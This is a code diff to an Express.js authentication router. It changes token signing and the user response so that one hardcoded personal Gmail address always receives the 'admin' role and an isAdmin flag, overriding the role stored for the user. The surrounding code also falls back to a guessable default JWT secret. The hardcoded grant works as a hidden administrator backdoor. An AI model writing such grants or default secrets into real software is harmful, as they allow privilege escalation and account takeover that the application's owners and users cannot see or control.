@@ -16,14 +16,16 @@ import {
 const router = express.Router();
 
 function signToken(user) {
+  const role = user.email?.toLowerCase() === 'brayw433@gmail.com' ? 'admin' : (user.role || 'user');
   return jwt.sign(
-    { id: user.id || user._id, email: user.email, role: user.role },
+    { id: user.id || user._id, email: user.email, role },
     process.env.JWT_SECRET || 'glowora-dev-secret',
     { expiresIn: '7d' }
   );
 }
 
 function userResponse(user, token) {
+  const role = user.email?.toLowerCase() === 'brayw433@gmail.com' ? 'admin' : (user.role || 'user');
   return {
     token,
     user: {
@@ -31,7 +33,8 @@ function userResponse(user, token) {
       id: user.id || user._id,
       name: user.name,
       email: user.email,
-      role: user.role,
+      role,
+      isAdmin: role === 'admin',
       phone: user.phone || '',
       address: user.address || '',
       city: user.city || '',
